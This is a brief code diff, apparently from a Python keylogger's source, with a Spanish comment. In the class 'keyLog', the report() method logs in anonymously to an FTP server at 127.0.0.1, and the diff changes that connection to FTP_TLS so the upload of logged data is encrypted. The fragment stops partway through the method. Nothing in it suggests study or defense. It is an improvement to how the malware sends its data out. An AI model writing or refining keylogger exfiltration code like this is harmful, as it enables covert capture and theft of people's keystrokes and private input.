@@ -54,7 +54,7 @@ class keyLog():
 
     def report(self):
 
-        session = ftplib.FTP('127.0.0.1', 'anonymous', 'anonymous')  # Conexión a un servidor FTP con TLS mediante el usuario anonymous. Dejar sólo FTP en lugar de FTP_TLS para conexiones sin cifrar 
+        session = ftplib.FTP_TLS('127.0.0.1', 'anonymous', 'anonymous')  # Conexión a un servidor FTP con TLS mediante el usuario anonymous. Dejar sólo FTP en lugar de FTP_TLS para conexiones sin cifrar 
         session.encoding = "utf-8"
 
         try:
